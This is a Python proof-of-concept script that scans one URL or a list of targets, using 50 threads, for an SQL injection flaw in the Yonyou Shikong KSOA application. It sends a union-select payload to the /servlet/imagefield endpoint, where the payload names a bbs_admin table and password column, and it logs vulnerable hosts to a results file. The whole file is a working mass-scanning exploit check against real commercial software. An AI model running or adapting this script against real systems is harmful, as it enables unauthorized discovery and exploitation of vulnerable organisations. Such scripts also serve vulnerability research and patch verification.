import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """                                                        
_____  _____________________ _    _____  ___________  __
__  / / /  __ \_  __ \_  __ `/    __  / / /  __ \  / / /
_  /_/ // /_/ /  / / /  /_/ /     _  /_/ // /_/ / /_/ / 
_\__, / \____//_/ /_/_\__, /_______\__, / \____/\__,_/  
/____/               /____/_/_____/____/                """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='用友时空 KSOA SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','1'))--+"
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close'


    }
    try:
        response = requests.get(url=target+api_payload,headers=headers,verify=False,timeout=10)
        if 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            print(f"[+]存在漏洞：{target}")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            return False
    except:
        print(f"[!]网站异常，请手工测试：{target}")

if __name__ == '__main__':
    main()